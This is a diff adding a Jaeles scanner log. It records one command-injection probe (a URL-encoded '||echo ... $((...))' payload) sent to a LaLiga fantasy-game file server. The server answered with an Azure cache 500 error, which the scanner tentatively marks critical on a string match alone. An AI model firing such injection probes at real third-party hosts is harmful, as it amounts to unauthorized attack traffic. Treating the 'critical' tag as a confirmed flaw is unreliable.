@@ -1,0 +1,18 @@
+[Vuln-Info][Errors-Vulns-01][Tentative-Critical] - https://files-deshisfantasy.laliga.com/%7C%7Cecho%20KRCSNE$((282037%2B31337))$(echo%20KRCSNE)KRCSNE
+[Sign-Info][Tentative-Critical] - /root/.jaeles/base-signatures/fuzz/common/ErrorsAndVulns.yaml - Errors and Vulnerabilities Detection
+[Detect-String] - StringSearch("response", "Internal Server Error")
+
+>>>>--------------------------------------------------
+GET https://files-deshisfantasy.laliga.com/%7C%7Cecho%20KRCSNE$((282037%2B31337))$(echo%20KRCSNE)KRCSNE HTTP/1.1
+
+--------------------------------------------------<<<<
+500 Internal Server Error HTTP/1.1 
+Content-Length: 15
+X-Azure-Externalerror: 0x830c101d, Error connecting to an Origin Shield parent cache.
+X-Azure-Ref: 0DGMhYAAAAAB5yhgfeDIqS7jfDMiZLa9hTUFEMzBFREdFMDUwNwAxNmIwZDM4OC01YTY3LTQ5NTgtYjA2Mi05YzA4M2U3ZjY0OWY=
+Date: Mon, 08 Feb 2021 16:12:59 GMT
+Total Length: 271
+Response Time: 1.537525
+
+Internal Error.
+
